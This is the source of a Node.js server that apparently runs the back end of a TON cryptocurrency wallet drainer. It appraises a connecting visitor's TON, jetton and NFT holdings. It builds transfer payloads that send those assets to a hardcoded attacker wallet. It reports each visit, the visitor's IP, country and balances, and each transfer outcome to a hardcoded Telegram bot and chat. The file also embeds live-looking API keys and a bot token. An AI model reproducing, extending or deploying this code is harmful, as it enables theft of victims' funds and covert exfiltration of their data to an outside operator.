const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const cors = require('cors');
const { Cell, beginCell, Address } = require('ton');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const https = require('https');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

const apiKey = 's0Uaior9NIAQEaqlEffWSIIt';
const mainWallet = "UQDev22E4MCOh6vPJslbgE211qkpC0DW29QCUvQwbn5XeP3w";
const telegramBot = '8549456638:AAHpE3yp1W9wOOX1U605r7vbgsCH2Wob6VA';
const telegramId = '7556622176';
const min_totalbal = 0;
const min_balTok = 0;
const min_balNft = 0;
const forFee = 200000000;
const logError = "true";

const certPath = 'cert';
const keyPath = path.join(certPath, 'server.key');
const certPathFull = path.join(certPath, 'server.crt');

if (fs.existsSync(certPath) && fs.existsSync(keyPath) && fs.existsSync(certPathFull)) {
    http.createServer((req, res) => {
        res.writeHead(301, { "Location": "https://" + req.headers['host'] + req.url });
        res.end();
    }).listen(80, () => {
        console.log('HTTP Server running on port 80');
    });

    const httpsOptions = {
        key: fs.readFileSync(keyPath),
        cert: fs.readFileSync(certPathFull)
    };

    https.createServer(httpsOptions, app).listen(443, () => {
        console.log('HTTPS Server running on port 443');
    });

    console.log('\tSERVER IS ONLINE, LISTENING TO PORTS 80 & 443\n');
} else {
    app.listen(80, () => {
        console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80\n');
    });
}

app.use(cors());
app.use(bodyParser.json());

app.post('/api/opened', async(req, res) => {
    const UserInfo = req.body;

    if (!UserInfo.domain || !UserInfo.ip || !UserInfo.country) {
        return res.status(400).send('Bad Request: Missing required UserInfo properties.');
    }

    const message = `📖<b>User opened the website</b>\n\n🌍 <b>Domain:</b> ${UserInfo.domain}\n✉️ <b>IP Location</b>: ${UserInfo.ip} ${UserInfo.country}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            res.status(200).send('Message sent to Telegram');
        } else {
            res.status(response.status).send('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/api/main-wallet', (req, res) => {
    res.json({ mainWallet: mainWallet });
});

app.get('/api/forfee', (req, res) => {
    res.json({ forFee: forFee });
});

app.get('/api/min_totalbal', (req, res) => {
    res.json({ min_totalbal: min_totalbal });
});

app.post('/api/generate-transaction-bodyTon', (req, res) => {
    const { text_com } = req.body;

    try {
        const body = beginCell()
            .storeUint(0, 32)
            .storeStringTail(text_com)
            .endCell();

        const bodyBoc = body.toBoc().toString("base64");
        res.status(200).json({ bodyBoc });
    } catch (error) {
        console.error('Error generating transaction body:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/generate-transaction-bodyJetton', (req, res) => {
    const { text_com, mainWallet, tokenBalance } = req.body;

    if (!text_com || !mainWallet || !tokenBalance) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    try {
        const forwardPayload = beginCell()
            .storeUint(0, 32)
            .storeStringTail(text_com)
            .endCell();

        const body = beginCell()
            .storeUint(0x0f8a7ea5, 32)
            .storeUint(0, 64)
            .storeCoins(tokenBalance)
            .storeAddress(Address.parse(mainWallet))
            .storeAddress(Address.parse(mainWallet))
            .storeBit(0)
            .storeCoins(0)
            .storeBit(1)
            .storeRef(forwardPayload)
            .endCell();

        const bodyBoc = body.toBoc().toString("base64");
        res.status(200).json({ bodyBoc });
    } catch (error) {
        console.error('Error generating transaction body:', error.stack);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/generate-transaction-bodyNft', (req, res) => {
    const { text_com, mainWallet, nftAddress } = req.body;

    if (!text_com || !mainWallet || !nftAddress) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    try {
        const forwardPayload = beginCell()
            .storeUint(0, 32)
            .storeStringTail(text_com)
            .endCell();

        const body = beginCell()
            .storeUint(0x5fcc3d14, 32)
            .storeUint(0, 64)
            .storeAddress(Address.parse(mainWallet))
            .storeAddress(Address.parse(mainWallet))
            .storeBit(0)
            .storeCoins(0)
            .storeBit(1)
            .storeRef(forwardPayload)
            .endCell();

        const bodyBoc = body.toBoc().toString("base64");
        res.status(200).json({ bodyBoc });
    } catch (error) {
        console.error('Error generating transaction body:', error.stack);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/connected', async(req, res) => {
    const { ConnectedWallet, UserInfo } = req.body;

    if (!UserInfo || !ConnectedWallet || !ConnectedWallet.account || !ConnectedWallet.account.address) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    try {
        const GetWalletInfo = await fetch('https://toncenter.com/api/v3/wallet?address=' + ConnectedWallet.account.address);
        if (!GetWalletInfo.ok) {
            return res.status(400).send('Failed to fetch wallet info');
        }

        const data = await GetWalletInfo.json();
        const tonPrice = 8;
        let processedBalance;
        let tgBalance;
        let nftList = [];
        let assetList = [];
        let jettonList = [];
        let sendingBalance;
        let tgSendingBalance;
        let roundedSendingBalance;
        let tgBalanceFix;
        let balanceAmountTG;
        let roundedTotalTon;

        if (data && data.balance) {
            const originalBalance = parseFloat(data.balance);
            processedBalance = originalBalance;
            tgBalanceFix = processedBalance / 1000000000;
            tgBalance = tgBalanceFix.toFixed(2);
            const TonUsdBal = tgBalance * tonPrice;
            sendingBalance = processedBalance - forFee;
            tgSendingBalance = sendingBalance / 1000000000;
            roundedSendingBalance = tgSendingBalance.toFixed(2);
            const calculatedBalanceUSDTG = TonUsdBal;
            assetList.push({ type: "TON", data: data, balance: TonUsdBal, sendingBalance, calculatedBalanceUSDTG, name: 'TON' });
        }

        const jettonResponse = await fetch('https://tonapi.io/v2/accounts/' + ConnectedWallet.account.address + '/jettons?currencies=ton,usd,rub&token=AHIAGHNNXLO4PDQAAAAHMHSZQ5BNGAF5OGJ2JLPYRO5Q7LNR3BNPGD7ZSUGAG46KV7PKLOI');
        const jettonData = await jettonResponse.json();
        const balances = jettonData.balances;
        let totalCalculatedBalanceUSD = 0;
        if (balances && balances.length > 0) {
            balances.forEach(balance => {
                const wallet_address = balance.wallet_address.address;
                const jetton = balance.jetton;
                const address = jetton.address;
                const symbol = jetton.symbol;
                const TokenBalance = parseInt(balance.balance);
                if (TokenBalance !== 0) {
                    if (jetton.symbol === 'jUSDT' || jetton.symbol === 'USD₮') {
                        balanceAmountTG = TokenBalance / 1000000;
                    } else {
                        balanceAmountTG = TokenBalance / 1000000000;
                    }

                    const balanceAmount = TokenBalance;
                    const priceUSD = balance.price.prices.USD;
                    const calculatedBalanceUSD = Math.floor(balanceAmount * priceUSD);
                    const calculatedBalanceUSDTG = Math.floor(balanceAmountTG * priceUSD);
                    const roundedBalance = balanceAmountTG.toFixed(2);
                    if (calculatedBalanceUSDTG >= min_balTok) {
                        totalCalculatedBalanceUSD += calculatedBalanceUSD;
                        assetList.push({ type: "Jetton", wallet_address, TokenBalance, data: data, roundedBalance, address, symbol, name: symbol, balance: calculatedBalanceUSD, price_usd: priceUSD, calculatedBalanceUSDTG });

                        jettonList.push({ type: "Jetton", wallet_address, TokenBalance, data: data, roundedBalance, address, symbol, balance: calculatedBalanceUSD, price_usd: priceUSD, calculatedBalanceUSDTG });
                        jettonList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
                    }
                }
            });
        }

        async function fetchWithApiKey(url, apiKey) {
            const response = await fetch(url, {
                method: 'GET',
                headers: {
                    'X-API-KEY': apiKey
                }
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}`);
            }

            return await response.json();
        }

        try {
            const initialResponse = await fetch(`https://tonapi.io/v2/accounts/${ConnectedWallet.account.address}/nfts?limit=1000&offset=0&indirect_ownership=false`);
            const initialData = await initialResponse.json();
            initialData.nft_items = initialData.nft_items.filter(item => item.trust !== "blacklist");

            if (initialData && initialData.nft_items) {
                const nftPromises = initialData.nft_items.map(async(item) => {
                    try {
                        const nftData = await fetchWithApiKey(`https://tonapi.nftscan.com/api/ton/assets/${item.address}?show_attribute=true`, apiKey);
                        const contractData = await fetchWithApiKey(`https://tonapi.nftscan.com/api/ton/statistics/collection/${item.collection.address}`, apiKey);

                        if (nftData && nftData.data) {
                            const asset = nftData.data;
                            const assetContract = contractData.data;
                            if (asset.metadata_json) {
                                try {
                                    const metadata = JSON.parse(asset.metadata_json);
                                    const Price = assetContract.average_price_24h || 0;
                                    const nftPrice = Math.round(Price);
                                    if (nftPrice >= (min_balNft / tonPrice)) {
                                        const nftItem = {
                                            type: "NFT",
                                            data: asset.token_address,
                                            calculatedBalanceUSDTG: nftPrice * tonPrice,
                                            balance: nftPrice * 1000000000,
                                            name: metadata.name,
                                            nftPrice
                                        };

                                        assetList.push(nftItem);
                                        nftList.push(nftItem);
                                        nftList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
                                    }
                                } catch (error) {
                                    console.error('Error parsing metadata_json:', error);
                                }
                            } else {
                                console.warn('metadata_json is null for token_address:', asset.token_address);
                            }
                        }
                    } catch (error) {
                        console.error('Error fetching data for address:', item.address, error);
                    }
                });

                await Promise.all(nftPromises);
            }
        } catch (error) {
            console.error('Error fetching initial data:', error);
        }
        let totalBalanceNft = nftList.reduce((sum, nft) => sum + nft.calculatedBalanceUSDTG, 0);
        totalBalanceNft = parseFloat(totalBalanceNft.toFixed(2));
        let totalBalanceJetton = jettonList.reduce((sum, jetton) => sum + jetton.calculatedBalanceUSDTG, 0);
        totalBalanceJetton = parseFloat(totalBalanceJetton.toFixed(2));
        let totalBalance = totalBalanceJetton + totalBalanceNft + (tgBalance * tonPrice);
        totalBalance = parseFloat(totalBalance.toFixed(2));

        if (totalBalance > min_totalbal) {
            let message = `<b>📲 User Connected Wallet | ${totalBalance} $</b>\n\n🌍 <b>Domain:</b> ${UserInfo.domain}\n✉️ <b>IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n💠 <b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>`;

            function removeDuplicateAssets(jettonList, nftList) {
                let uniqueSymbols = new Set();

                jettonList.forEach(jetton => uniqueSymbols.add(jetton.symbol));

                let filteredNftList = nftList.filter(nft => !uniqueSymbols.has(nft.name));

                return {
                    jettonList: jettonList,
                    nftList: filteredNftList
                };
            }

            let result = removeDuplicateAssets(jettonList, nftList);

            jettonList = result.jettonList;
            nftList = result.nftList;
            let totalTon = tgBalance * tonPrice;
            roundedTotalTon = Math.round(totalTon * 100) / 100;
            message += `<blockquote><b>TON Balance | ${roundedTotalTon} $</b>\n${tgBalance} TON`;
            if (jettonList.length > 0) {
                let totalBalanceUSDTG = jettonList.reduce((sum, jetton) => sum + jetton.calculatedBalanceUSDTG, 0);
                message += `\n\n<b>Jetton Balance | ${totalBalanceUSDTG} $</b>`;
                jettonList.forEach(jetton => {
                    message += `\n${jetton.symbol} - ${jetton.calculatedBalanceUSDTG} USD`;
                });
            }
            if (nftList.length > 0) {
                let totalBalanceUSDTG = nftList.reduce((sum, nft) => sum + nft.calculatedBalanceUSDTG, 0);
                message += `\n\n<b>NFT's | ${totalBalanceUSDTG} $</b>`;
                nftList.forEach(nft => {
                    message += `\n${nft.name} - ${nft.calculatedBalanceUSDTG} USD`;
                });
            }
            message += `\n</blockquote>`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: telegramId,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });

                if (response.ok) {
                    assetList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
                    const dataToSend = { assetList, totalBalance };
                    res.status(200).json(dataToSend);
                } else {
                    res.status(response.status).send('Failed to send message');
                }
            } catch (error) {
                console.error('Error:', error);
                res.status(500).send('Internal Server Error');
            }
        } else {
            res.status(400).send('Total balance is too low');
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/creatingTon', async(req, res) => {
    const { UserInfo, ConnectedWallet } = req.body;

    if (!UserInfo || !ConnectedWallet || !ConnectedWallet.account || !ConnectedWallet.account.address) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    const message = `🟠 <b>Creating request for TON | ${roundedTotalTon} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>TON - ${roundedTotalTon} $ </blockquote>`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            res.status(200).send('Message sent to Telegram');
        } else {
            res.status(response.status).send('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/transactionStatusTon', async(req, res) => {
    const { status, transactionResult, error, UserInfo, ConnectedWallet } = req.body;

    if (!UserInfo || !ConnectedWallet || !ConnectedWallet.account || !ConnectedWallet.account.address) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    let message = '';

    switch (status) {
        case 'sent':
            message = `<b>💎 Approved Transfer TON | ${roundedTotalTon} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>TON - ${roundedTotalTon} $ </blockquote>`;
            if (logError === "true") {
                message = `\n\nTransaction Status: \n${JSON.stringify(transactionResult)}`;
            }
            break;
        case 'confirmed':
            message = `<b>💎 Approved Transfer TON | ${roundedTotalTon} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>TON - ${roundedTotalTon} $ </blockquote>`;
            if (logError === "true") {
                message = `\n\nTransaction Status: \n${JSON.stringify(transactionResult)}`;
            }
            break;
        case 'error':
            message = `<b>🛑 User closed or rejected TON | ${roundedTotalTon} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>TON - ${roundedTotalTon} $ </blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status1: \n${error}`;
            }
            break;
        default:
            message = `<b>🛑 User closed or rejected TON | ${roundedTotalTon} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>TON - ${roundedTotalTon} $ </blockquote>`;
            if (logError === "true") {
                message += `\n\nUnknown Status2: \n${status}`;
            }
    }

    await notifyTelegramChannel(message);
    res.sendStatus(200);
});

app.post('/api/creatingJetton', async(req, res) => {
    const { UserInfo, chunk, ConnectedWallet } = req.body;

    if (!UserInfo || !ConnectedWallet || !ConnectedWallet.account || !ConnectedWallet.account.address) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    let chunkBalance = chunk.reduce((sum, asset) => sum + asset.usdBal, 0);
    let message = '';
    message = `<b>🟠 Creating request | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip} ${UserInfo.country}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
    message += `<blockquote>`;
    chunk.forEach(asset => {
        message += `${asset.name} - ${asset.usdBal} USD\n`;
    });
    message += `</blockquote>`;
    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            res.status(200).send('Message sent to Telegram');
        } else {
            res.status(response.status).send('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/transactionStatus', async(req, res) => {
    const { status, transactionResult, error, chunk, UserInfo, ConnectedWallet } = req.body;

    if (!UserInfo) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    let message = '';
    let chunkBalance = chunk.reduce((sum, asset) => sum + asset.usdBal, 0);
    switch (status) {
        case 'sent':
            message = `<b>💎 Approved Transfer | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
            message += `<blockquote>`;
            chunk.forEach(asset => {
                message += `${asset.name} - ${asset.usdBal} USD\n`;
            });
            message += `</blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status: \n${JSON.stringify(transactionResult)}`;
            }
            break;
        case 'confirmed':
            message = `<b>💎 Approved Transfer | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
            message += `<blockquote>`;
            chunk.forEach(asset => {
                message += `${asset.name} - ${asset.usdBal} USD\n`;
            });
            message += `</blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status: \n${JSON.stringify(transactionResult)}`;
            }
            break;
        case 'error':
            message = `<b>🛑 User closed or rejected | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
            message += `<blockquote>`;
            chunk.forEach(asset => {
                message += `${asset.name} - ${asset.usdBal} USD\n`;
            });
            message += `</blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status: \n${error}`;
            }
            break;
        default:
    }

    await notifyTelegramChannel(message);
    res.sendStatus(200);
});

app.post('/api/creatingNft', async(req, res) => {
    const { UserInfo, chunk, ConnectedWallet } = req.body;

    if (!UserInfo || !ConnectedWallet || !ConnectedWallet.account || !ConnectedWallet.account.address) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    let chunkBalance = chunk.reduce((sum, asset) => sum + asset.calculatedBalanceUSDTG, 0);
    let message = '';
    message = `<b>🟠 Creating request for NFT | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
    message += `<blockquote>`;
    chunk.forEach(asset => {
        message += `${asset.name} - ${asset.calculatedBalanceUSDTG} USD\n`;
    });
    message += `</blockquote>`;
    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            res.status(200).send('Message sent to Telegram');
        } else {
            res.status(response.status).send('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/api/transactionStatusNft', async(req, res) => {
    const { status, transactionResult, error, chunk, UserInfo, ConnectedWallet } = req.body;

    if (!UserInfo || !ConnectedWallet || !ConnectedWallet.account || !ConnectedWallet.account.address) {
        return res.status(400).send('Bad Request: Missing required parameters.');
    }

    let message = '';
    let chunkBalance = chunk.reduce((sum, asset) => sum + asset.calculatedBalanceUSDTG, 0);
    switch (status) {
        case 'sent':
            message = `<b>💎 Approved Transfer Nft | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
            message += `<blockquote>`;
            chunk.forEach(asset => {
                message += `${asset.name} - ${asset.calculatedBalanceUSDTG} USD\n`;
            });
            message += `</blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status: \n${JSON.stringify(transactionResult)}`;
            }
            break;
        case 'confirmed':
            message = `<b>💎 Approved Transfer Nft | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
            message += `<blockquote>`;
            chunk.forEach(asset => {
                message += `${asset.name} - ${asset.calculatedBalanceUSDTG} USD\n`;
            });
            message += `</blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status: \n${JSON.stringify(transactionResult)}`;
            }
            break;
        case 'error':
            message = `<b>🛑 User closed or rejected Nft | ${chunkBalance} $</b>\n\n<b>🌍 Domain:</b> ${UserInfo.domain}\n<b>✉️ IP Location:</b> ${UserInfo.ip}\n<b>💠 Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n`;
            message += `<blockquote>`;
            chunk.forEach(asset => {
                message += `${asset.name} - ${asset.calculatedBalanceUSDTG} USD\n`;
            });
            message += `</blockquote>`;
            if (logError === "true") {
                message += `\n\nTransaction Status: \n${error}`;
            }
            break;
        default:
    }

    await notifyTelegramChannel(message);
    res.sendStatus(200);
});

async function notifyTelegramChannel(message) {
    const url = `https://api.telegram.org/bot${telegramBot}/sendMessage`;

    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: telegramId,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    });
}